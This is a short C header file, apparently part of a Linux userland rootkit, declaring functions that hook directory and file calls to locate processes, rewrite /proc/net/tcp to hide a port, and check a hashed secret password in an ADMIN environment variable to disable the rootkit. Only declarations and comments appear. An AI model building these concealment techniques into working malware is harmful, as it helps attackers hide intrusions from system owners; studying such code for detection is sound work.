#include <stdio.h>
#include <dirent.h>
int get_pid_of_process_with_name(const char *process_name, struct dirent *(*original_readdir)(DIR *) , DIR* (*original_opendir)(const char *), FILE* (*original_fopen)(const char *, const char *));

int get_dir_name(DIR* dirp, char* buf, size_t size);

/**
 * @brief Verifies whether the secret password is specified to temporarily disable the rootkit
 * 
 * This function checks whether the secret password is specified to nullify the rootkit.
 * Specifically, it checks whether the ADMIN environment variable is set to the secret password.
 * The secret password is defined in the CMakeLists.txt file at compile time. The password is hashed using the 
 * string(SHA256) function in CMake at compile time. This protects the password from being reverse engineered.
 * 
 * @return int 1 if the secret password is specified, 0 otherwise
*/
int verify_token();

char* get_filename_of_overwritten_proc_net_tcp_w_hidden_port(int port, const char* path);